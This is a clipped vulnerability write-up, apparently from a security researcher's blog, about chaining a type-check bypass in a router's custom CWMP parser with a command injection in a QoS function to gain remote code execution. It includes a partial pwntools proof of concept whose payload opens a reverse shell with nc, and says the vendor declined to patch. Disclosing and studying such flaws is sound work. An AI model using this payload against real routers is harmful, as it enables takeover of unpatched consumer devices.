---
title: "1day: Abusing custom CWMP XML parsing to achieve RCE · Numb3rs' blog"
source: https://numb3rs.re/posts/abusing_cwmp_xml_parsing/
source_host: numb3rs.re
clip_date: 2026-10-20T10:15:24+08:00
trace_id: 98df87e2-a009-45b3-9271-6bd571490731
content_hash: d259f117a48649a8e154dab82cea9d5fb29230d18484f83ab924cdf5760eb56b
status: synced
tags:
  - 漏洞分析
  - 协议分析
series: null
feed_source: Numb3rs·移动/IoT 漏洞研究
ai_summary: 路由器定制的 CWMP 实现只校验 XML 中声明的参数类型，却不校验实际值，配合 QoS 函数里的 `system()` 调用，可链式达成未认证 RCE。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 3ff75244-d011-817b-a3dd-cb29c92b93bb
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> 路由器定制的 CWMP 实现只校验 XML 中声明的参数类型，却不校验实际值，配合 QoS 函数里的 `system()` 调用，可链式达成未认证 RCE。
> 
> - **攻击面：** 目标设备未用标准 TR-069 协议栈，而是使用 `/usr/bin/cwmp` 二进制和 `libcwmp.so`；前者通过 `dlopen`/`dlsym`，按请求里给出的函数名动态调用后者。
> - **漏洞一（类型不匹配）：** `SetParameterValues` 仅比较声明类型与库函数签名是否匹配，便用 `reqType` 和 `"u"`、`"C"` 做简单比较；于是可对期望 `unsignedInt` 的函数传入任意字符串。
> - **漏洞二（命令注入）：** `X_REDACTED_QoS_Upband` 用 `sprintf` 把请求值拼进命令串再交给 `system()` 执行；虽有栈溢出，但受 stack canary 保护，命令注入仍可直接利用。
> - **利用链：** 自行实现 CWMP 客户端（登录 Web 界面、设置 ACS 地址、重启 cwmp 服务）——> 建立 SOAP 会话并回应 Inform——> 发送声明为 `xsd:unsignedInt`、实为反引号包裹 shell 的 Upband 参数，反弹 nc shell。
> - **厂商响应：** 漏洞已上报，厂商认为不值得修复，整条产品线仍然受影响。

## Introduction

Parallèlement à mon activité principale, j’ai récemment entrepris en side project de chercher des vulnérabilités sur une gamme de routeurs grand public. Il s’avère que lors du mapping de la surface d’attaque, j’ai découvert une implémentation customisée du protocole CWMP (CPE WAN Management Protocol). En effet, contrairement à une implementation standard de la stack TR-069, ces appareils avaient leur propre service CWMP dans /usr/bin/cwmp avec une shared library libcwmp.so.

Il est très fréquent que lors de l’implementation d’un tel protocole, des constructeurs peu consciencieux ne prêtent pas ou peu d’attention à la securité de leurs produits. En remontant la piste de ce protocole, j’ai découvert une `type mismatch` vulnerability dans la logique de parsing des requêtes. Cette vulnérabilité chainée à une injection de commmande nous permet d’avoir une Remote Code Execution sur l’appareil.

* * *

## Attack Surface Mapping

En dépit de failles plutôt aisées à trouver telles que des injections de commandes en lua (qui étaient toutes patchées avec des formatter comme `%q`), l’implémentation custom de cwmp représentait une cible bien plus intéressante aussi bien d’un point de vue technique que d’un point de vue de vecteur d’attaque.

-   `/usr/bin/cwmp` – le binaire (strippé) implémentant CWMP
-   `libcwmp.so` – une librairie chargée au runtime et qui reçoit les paramètres des requêtes parsées.

En utilisant des cross-références, j’ai en effet remarqué que le binaire utilise `dlsym` pour appeler une fonction avec les paramètres extraits de la requête.

```c
int __fastcall api_libcwmp(const char *func_name) {
    if (!handle)
        handle = dlopen("/usr/lib/libcwmp.so", 1);
    if (!handle) return -1;

    int (*func)(int, char *) = dlsym(handle, func_name);
    if (dlerror()) return -1;

    return func(v6, &req);
}
```

* * *

## Vulnerability 1: Type Mismatch in SetParameterValues

La méthode `SetParameterValues` parse notre requêtes XML, et extrait le nom du paramètre, le type de la valeur ainsi que la valeur. Le binaire s’assure ensuite que le type du paramètre correspond à celui de la fonction dans la librairie.

Cependant, la logique de cette vérification est lacunaire car la fonction ne compare que le type déclaré avec le type de la fonction et ne vérifie pas que le contenu correspond au type déclaré.

```c
if (MethodType != reqType && (reqType != "u" || (MethodType & 0xFFFFFFEF) != "C")) {
    log_error("param %s type mismatch\n", paramName);
}
```

Cela permet par exemple **à un attaquant de passer un string à une fonction qui attend un `unsignedInt` ou un autre type de valeur**.

* * *

## Vulnerability 2: Command Injection in QoS Function

La fonction “X_REDACTED_QoS_Upband” qui attend un `unsignedInt` construit une commande avec la valeur donnée et cette commande est ensuite passée à la fonction `system`

```c
sprintf(cmd, "/usr/bin/tr069/cwmp-qos 1 %s 0", req->buffer);
system(cmd);
```

Bien qu’il y ait un buffer overflow via l’utilisation de `sprintf`, il n’était pas possible d’exploiter la vulnérabilité à cause du stack canary. Cependant, l’injection de commande est quant à elle bien exploitable.

Comme le type du paramètre n’etait pas strictement appliqué, il est possible d’injecter une commande par l’envoi d’une requête qui spécifie un type `unsignedInt` mais qui contienne quand même autre chose que le type de valeur attendue.

* * *

## Exploitation Chain

L’exploitation du routeur repose donc sur l’enchainement de deux vulnérabilités:

1.  **Type Mismatch** – Qui permet de passer outre la vérification du type de `SetParameterValues`.
2.  **Command Injection** – Injection d’une commande arbitraire via la fonction QoS.

En réimplémentant un client CWMP, on peut construire un payload SOAP qui déclare le paramètre comme `xsd:unsignedInt` mais qui contienne une commande.

### POC

Voila l’exploitation complète de ces vulnérabilités:

```python
from pwn import *
import argparse
from web_client import WebClient


def transform_header(header: dict) -> str:
    [...]


def generate_body(data: bytes):
    [...]


def send_http_response(code: int, header: dict, body: bytes, p):
    [...]

def generate_header(data):
    [...]

def informresponse(p):
    [...]


def close_conn(p):
    [...]

def set_config_value(name: str, data_type: str, value: bytes, p):
    [...]

def trigger_rce1(ip: str, port: int, p):
    set_config_value(
        "InternetGatewayDevice.X_REDACTED_QoS.Upband",
        "unsignedInt",
        b"`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|ash -i 2>&1|nc %b %i >/tmp/f &`"
        % (ip.encode(), port),
        p,
    )


cli = WebClient("192.168.10.1")
cli.login("password")
cli.set_cwmp_param("192.168.10.X:3333", "", "", 3333)
cli.restart_cwmp()

listener = listen(3333)

p = listener.wait_for_connection()

p.recvuntil(b"</SOAP-ENV:Envelope>\n")

informresponse(p)

p.clean()
trigger_rce1("192.168.10.X", 1338, p)

p.interactive()


close_conn(p)
```

* * *

## Conclusion

J’ai donc pu chainer une ’type mismatch’ vulnerability avec une injection de commande pour réaliser une RCE sur une gamme entière de routeurs. J’ai bien sûr rapporté la faille au constructeur qui n’a pas jugé intéressant de la patcher.
